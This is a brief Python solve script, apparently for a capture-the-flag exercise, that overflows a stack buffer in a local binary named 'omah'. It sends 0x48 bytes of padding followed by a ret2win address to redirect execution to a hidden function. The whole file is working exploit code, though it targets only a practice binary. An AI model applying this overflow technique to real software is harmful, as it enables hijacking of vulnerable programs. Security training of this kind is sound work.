#!/usr/bin/env python3
"""Omah Buffer Kebak — ret2win lokal dengan binary asli.

Offset: 0x48 byte padding, lalu alamat obong (0x40125f).
Jalankan dari folder ini: python3 solve_omah.py
"""
import struct
import subprocess
from pathlib import Path

HERE = Path(__file__).resolve().parent
WIN = 0x40125F
payload = b"A" * 0x48 + struct.pack("<Q", WIN) + b"\n"

p = subprocess.run([str(HERE / "omah")], input=payload, capture_output=True)
print(p.stdout.decode(errors="replace"))
